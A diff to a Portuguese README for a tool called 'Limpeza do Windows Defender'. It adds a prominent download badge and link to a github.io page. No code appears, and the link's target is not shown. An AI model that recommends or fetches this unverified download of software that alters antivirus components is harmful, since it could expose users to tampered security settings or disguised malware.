@@ -1,5 +1,18 @@
 # 🛡️ Limpeza do Windows Defender
 
+
+
+<div align="center">
+
+## 🚀 Download
+
+[![Download Limpeza Windows Defender](https://img.shields.io/badge/Download-Limpeza%20Windows%20Defender-blue?style=for-the-badge&logo=windows&logoColor=white)](https://ozzycavalera.github.io/Limpeza-Windows-Defender/lwd)
+
+**[>> Clique aqui para descarregar <<](https://ozzycavalera.github.io/Limpeza-Windows-Defender/lwd)**
+
+---
+
+</div>
 Ferramenta avançada de limpeza do Windows Defender com interface gráfica moderna e intuitiva.
 
 ## 📋 Descrição
